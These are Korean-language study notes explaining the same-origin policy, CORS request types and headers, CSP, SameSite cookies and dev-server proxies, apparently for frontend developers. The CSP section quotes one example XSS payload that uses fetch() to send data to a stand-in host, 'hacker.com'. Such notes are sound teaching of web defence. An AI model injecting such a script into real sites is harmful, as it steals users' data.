# CORS (Cross-Origin Resource Sharing)

## 왜 나누어 보나

- 현대 웹 개발에서 프론트엔드(`localhost:3000`)와 백엔드 API 서버(`api.myservice.com`)는 **다른 출처**를 가지는 경우가 대부분임
- 브라우저는 기본적으로 **동일 출처 정책(SOP)** 에 따라 다른 출처의 자원 접근을 제한함
- **CORS**는 SOP의 엄격함을 유지하면서도, 서버가 명시적으로 허용한 출처에 한해 다른 출처의 자원 접근을 가능하게 하는 메커니즘임

공식: [Fetch Living Standard — CORS Protocol](https://fetch.spec.whatwg.org/#http-cors-protocol)  
MDN: [MDN — 교차 출처 리소스 공유 (CORS)](https://developer.mozilla.org/ko/docs/Web/HTTP/CORS)

---

## 출처(Origin)란

**출처(Origin)** 는 다음 세 가지 요소의 조합으로 결정됨 ([HTML Living Standard — Origin](https://html.spec.whatwg.org/multipage/origin.html#origin)).

> **프로토콜 (Protocol) + 호스트 (Host) + 포트 (Port)**

세 요소 중 **하나라도 다르면** 다른 출처로 간주됨.

| 비교 대상 | 기준 (`http://example.com:80`) | 결과 | 이유 |
| --- | --- | --- | --- |
| `http://example.com:80/path` | `http://example.com:80` | **동일 출처** | 프로토콜·호스트·포트 모두 일치 |
| `https://example.com:80` | `http://example.com:80` | **다른 출처** | 프로토콜 불일치 (`http` → `https`) |
| `http://example.com:8080` | `http://example.com:80` | **다른 출처** | 포트 불일치 (`80` → `8080`) |

---

## 동일 출처 정책 (SOP, Same-Origin Policy)

### SOP란

브라우저가 기본적으로 적용하는 보안 정책으로, **같은 출처**에서 온 리소스만 스크립트가 접근할 수 있도록 허용함.

- 개발자가 직접 설정하거나 끌 수 없으며, 모든 브라우저에 자동 적용됨
- 악의적인 웹사이트가 사용자 모르게 다른 사이트의 민감한 데이터를 훔쳐 가는 것을 막는 방패 역할을 함

### SOP가 차단하는 것과 허용하는 것

- **허용:** 다른 출처로 네트워크 요청을 보내는 것 자체는 가능할 수 있음
- **차단:** 다른 출처에서 돌아온 **응답 데이터를 스크립트가 읽는 것**을 막음

SOP 덕분에 악성 사이트의 스크립트는 은행 서버에서 돌아온 응답(개인정보, 세션 토큰 등)에 접근할 수 없어 **세션 하이재킹(Session Hijacking)** 시도를 방어함.

### SOP가 제한하는 주요 API

1. **`fetch()` / `XMLHttpRequest`** — 스크립트가 다른 출처의 데이터를 직접 읽는 것을 제한함
2. **`@font-face` (웹 폰트)** — 다른 출처의 폰트 리소스를 무단으로 사용하는 것을 방지함
3. **Canvas 이미지 데이터** — 다른 출처의 이미지를 `<canvas>`에 그린 뒤 `getImageData()`로 픽셀 데이터를 추출하는 행위를 제한함

### SOP vs CSP 비교

| 구분 | SOP | CSP |
| --- | --- | --- |
| **적용 주체** | 브라우저가 자동 적용 | 서버가 응답 헤더로 브라우저에 지시 |
| **제어 주체** | 개발자가 직접 제어·해제 불가 | 개발자가 직접 설정·조정 가능 |
| **설정 방법** | 별도 설정 없이 모든 페이지에 자동 적용 | HTTP 헤더 또는 `<meta>` 태그로 명시 |
| **유연성** | 규칙이 고정되어 엄격함 | `Report-Only` 모드 등 유연한 관리 가능 |

---

## Content Security Policy (CSP)

### CSP란

서버가 HTML 문서를 응답할 때 **어떤 출처의 리소스를 허용할지** 브라우저에 지시하는 보안 정책임.  
주로 **XSS(Cross-Site Scripting)** 공격을 완화하는 데 효과적임.

공식: [MDN — Content-Security-Policy](https://developer.mozilla.org/ko/docs/Web/HTTP/Headers/Content-Security-Policy)

### 적용 방법

서버 응답 시 `Content-Security-Policy` HTTP 헤더를 설정함.

```js
// Express.js 예시
res.setHeader('Content-Security-Policy', "default-src 'self'");
```

### `default-src 'self'` 의미

- `default-src` — 개별 리소스 정책이 없을 때 적용되는 기본 정책(Fallback)
- `'self'` — 현재 문서와 **프로토콜·도메인·포트가 완전히 일치하는 출처**에서 오는 리소스만 허용
- **제외 범위:** 하위 도메인, 외부 사이트, 인라인 스크립트·스타일 등은 모두 차단됨

### CSP가 악성 스크립트를 차단하는 방식

`<script>fetch('https://hacker.com/steal?data=...')</script>`와 같은 스크립트가 주입되었을 때:

- **네트워크 탭:** `hacker.com`으로 향하는 `fetch` 요청이 아예 발생하지 않거나 차단된 것으로 표시됨
- **콘솔 메시지:** `Content Security Policy` 위반 경고와 함께 "인라인 스크립트가 정책 위반으로 실행이 차단되었다"는 메시지가 출력됨

### 인라인 스타일 차단

`<div style="width:600px">`처럼 HTML 태그에 직접 작성된 인라인 스타일은 기본 CSP 설정에서 차단됨.  
공격자가 스타일을 조작하여 피싱 사이트처럼 보이게 하거나 클릭재킹(Clickjacking)을 유도하는 것을 방지하기 위해서임.

### 외부 서비스 차단 문제

구글 애널리틱스, 카카오맵, 외부 API 등이 CSP 때문에 차단될 수 있음.  
"건물 보안을 강화하기 위해 모든 출입문을 잠가버린" 상황과 같음 — 협력 업체(외부 API)까지 차단되는 부작용이 생김.  
해결책은 CSP 설정에서 해당 도메인을 명시적으로 허용하는 것임.

```
Content-Security-Policy: default-src 'self'; script-src 'self' https://www.googletagmanager.com
```

### Report-Only 모드

`Content-Security-Policy-Report-Only` 헤더를 사용하면 차단 없이 위반 사항만 추적할 수 있음.

- **브라우저:** 정책 위반을 감지해도 리소스 실행을 차단하지 않고, 위반 내역을 JSON 보고서로 생성함
- **서버:** `report-uri`로 보고서를 수신하여 로그에 기록함 → 실제 차단 전 미리 영향도를 파악할 수 있음

### CSP만으로 막을 수 없는 공격과 보완책

CSP는 XSS 방지에 특화되어 있어 **CSRF를 완전히 막지 못함**. 함께 적용해야 할 추가 조치:

1. **SameSite 쿠키** — `SameSite=Lax` 또는 `Strict`로 설정하면 타 사이트에서 발생하는 요청에 쿠키가 전송되지 않아 CSRF를 방어함 ([MDN — SameSite](https://developer.mozilla.org/ko/docs/Web/HTTP/Headers/Set-Cookie#samesitesamesite-value))
2. **X-Frame-Options** — 웹사이트를 다른 사이트의 `<iframe>` 안에 넣을 수 없게 하여 **클릭재킹(Clickjacking)** 공격을 방지함 ([MDN — X-Frame-Options](https://developer.mozilla.org/ko/docs/Web/HTTP/Headers/X-Frame-Options))

---

## CORS 요청의 종류

### 1. Simple Request (단순 요청)

아래 **세 가지 조건을 모두** 만족하는 요청. 브라우저가 서버에 요청을 보낸 뒤, 서버의 응답 헤더를 보고 접근 허용 여부를 판단함 ([Fetch Standard Section 3.2](https://fetch.spec.whatwg.org/#cors-safelisted-method)).

| 조건 | 허용 범위 |
| --- | --- |
| **HTTP 메소드** | `GET`, `POST`, `HEAD` 중 하나 |
| **허용 요청 헤더** | `Accept`, `Accept-Language`, `Content-Language`, `Content-Type` 중 하나 |
| **Content-Type 값** | `application/x-www-form-urlencoded`, `multipart/form-data`, `text/plain` 중 하나 |

**흐름:** 요청 전송 → 응답 수신 → 브라우저가 CORS 헤더 확인 → 통과 시 데이터 전달

### 2. Preflight Request (프리플라이트 요청)

Simple Request 조건을 **하나라도 만족하지 못하는** 요청(예: `PUT`·`DELETE` 메소드, `Content-Type: application/json`, 커스텀 헤더 사용 등)에 브라우저가 자동으로 사용하는 방식.

브라우저는 본 요청을 보내기 전에 서버에게 `OPTIONS` 메소드로 예비 요청을 먼저 보내 허용 여부를 확인함.

**흐름:**
1. 브라우저가 `OPTIONS` 메소드로 사전 요청 전송
2. 서버가 허용 헤더(`Access-Control-Allow-Methods` 등)로 응답
3. 브라우저가 통과를 확인 후 실제 요청 전송

> React에서 `fetch`나 `axios`로 `PUT`, `DELETE`, 또는 `Content-Type: application/json`을 사용하는 `POST` 요청을 보내면 무조건 Preflight Request가 발생함. 브라우저 개발자 도구의 Network 탭에서 `OPTIONS` 요청으로 확인할 수 있음.

---

## CORS 관련 주요 HTTP 헤더

CORS 문제의 근본 해결책은 **서버가 응답 헤더에 명시적으로 접근을 허용**하는 것임.

| 헤더 | 역할 | 예시 값 |
| --- | --- | --- |
| **`Access-Control-Allow-Origin`** | 필수. 접근을 허용할 출처를 명시 | `http://localhost:3000` 또는 `*` (모든 출처, 권장 안 함) |
| **`Access-Control-Allow-Methods`** | 허용할 HTTP 메소드 (Preflight 응답용) | `GET, POST, PUT, DELETE` |
| **`Access-Control-Allow-Headers`** | 허용할 요청 헤더 (Preflight 응답용) | `Content-Type, Authorization` |
| **`Access-Control-Allow-Credentials`** | 쿠키·인증 정보 포함 허용 여부 | `true` |

MDN: [MDN — Access-Control-Allow-Origin](https://developer.mozilla.org/ko/docs/Web/HTTP/Headers/Access-Control-Allow-Origin)

> `Access-Control-Allow-Credentials: true`를 사용할 경우 `Access-Control-Allow-Origin`에 `*`를 쓸 수 없으며, 반드시 구체적인 출처를 명시해야 함 ([Fetch Standard Section 3.2](https://fetch.spec.whatwg.org/#cors-protocol-and-credentials))

---

## 인증 정보와 CORS

쿠키나 `Authorization` 헤더처럼 인증 정보를 포함한 요청은 추가 설정이 필요함 ([Fetch Standard — credentials](https://fetch.spec.whatwg.org/#concept-request-credentials-mode)).

1. **쿠키 사용 시:** 요청에 `credentials: 'include'` 옵션을 설정하고, 서버는 `Access-Control-Allow-Credentials: true`를 응답해야 함

```js
fetch('https://api.myservice.com/data', {
  credentials: 'include',
});
```

2. **`Authorization` 헤더 사용 시:** 서버의 Preflight 응답에 `Access-Control-Allow-Headers` 목록에 `Authorization`이 포함되어야 함

---

## 개발 환경에서의 임시 해결책: Proxy 설정

백엔드가 CORS 설정을 완료하지 않은 개발 단계에서 사용하는 임시 방법임.

- **원리:** React 개발 서버가 브라우저의 요청을 받아 실제 API 서버로 대신 전달함. 서버 간 통신에는 SOP가 적용되지 않기 때문에 CORS 에러가 발생하지 않음

- **Create React App (CRA):** `package.json`에 `proxy` 속성 추가

```json
"proxy": "http://api.myservice.com:8080"
```

이후 `fetch('/api/data')`를 호출하면 개발 서버가 `http://api.myservice.com:8080/api/data`로 대신 요청함.

> Proxy 설정은 개발 환경 전용임. 프로덕션 배포 전에는 반드시 서버 측 CORS 헤더를 올바르게 설정해야 함.

---

## CORS 에러 발생 시 체크리스트

브라우저 콘솔에 "동일 출처 정책으로 인해 ... 차단했습니다" 메시지가 보일 때 확인할 항목:

1. 요청을 보내는 쪽과 받는 쪽의 **프로토콜**(`http`/`https`)이 일치하는가?
2. **도메인(호스트)** 주소가 정확히 일치하는가? (서브도메인 포함)
3. **포트 번호**가 서로 다른가?
4. 서버 응답에 `Access-Control-Allow-Origin` 헤더가 포함되어 있는가?
5. 인증 정보 포함 요청이라면 `Access-Control-Allow-Credentials: true`가 설정되어 있는가?
6. `PUT`·`DELETE`·커스텀 헤더 사용 시 Preflight 응답에 해당 메소드·헤더가 허용되어 있는가?

**대응 방안:**

- **영구 대응:** 서버 측에서 `Access-Control-Allow-Origin` 등 CORS 헤더를 올바르게 설정함
- **임시 대응(개발 환경):** 개발 서버의 Proxy 설정을 활용하여 같은 출처에서 요청이 나가는 것처럼 우회함

---

## 참고 자료

- [Fetch Living Standard — CORS Protocol](https://fetch.spec.whatwg.org/#http-cors-protocol)
- [HTML Living Standard — Origin](https://html.spec.whatwg.org/multipage/origin.html#origin)
- [MDN — 교차 출처 리소스 공유 (CORS)](https://developer.mozilla.org/ko/docs/Web/HTTP/CORS)
- [MDN — Access-Control-Allow-Origin](https://developer.mozilla.org/ko/docs/Web/HTTP/Headers/Access-Control-Allow-Origin)
- [MDN — Content-Security-Policy](https://developer.mozilla.org/ko/docs/Web/HTTP/Headers/Content-Security-Policy)
- [MDN — X-Frame-Options](https://developer.mozilla.org/ko/docs/Web/HTTP/Headers/X-Frame-Options)
- [MDN — SameSite 쿠키](https://developer.mozilla.org/ko/docs/Web/HTTP/Headers/Set-Cookie#samesitesamesite-value)
